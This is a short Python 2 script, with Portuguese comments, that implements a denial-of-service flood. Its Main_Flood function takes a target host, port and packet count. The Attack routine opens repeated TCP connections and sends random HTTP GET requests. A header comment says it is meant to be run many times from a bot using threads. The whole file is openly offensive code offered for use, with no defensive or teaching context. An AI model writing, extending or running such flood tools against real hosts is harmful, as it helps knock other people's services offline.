# Usar os Threads chamando a partir do bot chamando varias vezes esse script
#Edited by Mouse_BL0ck

import sys
import socket
import time
import random 
import string 


def Attack():

	try:
		ip = socket.gethostbyname(host)
	
	except:
		ip = host
    
	msg = str(string.letters + string.digits + string.punctuation)
	data = "".join(random.sample(msg,5))
    
	for i in range(0, packages, 1):

		dos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	
		try:
			dos.connect((ip, port))
			
			dos.send("GET /%s HTTP/1.1\r\n" %(data))
	
		except socket.error:
			pass

		dos.close()
	
	return True
	
def Main_Flood(h_host, h_port, h_packages):

	global host, port, packages

	host = str(h_host).replace("https://","").replace("http://","").replace("www","")
	port = int(h_port)

	packages = int(h_packages)

	if(Attack()):
		return True
	
	else:
		return False
	


#Main_Flood('192.168.0.3', 80, 10000) Example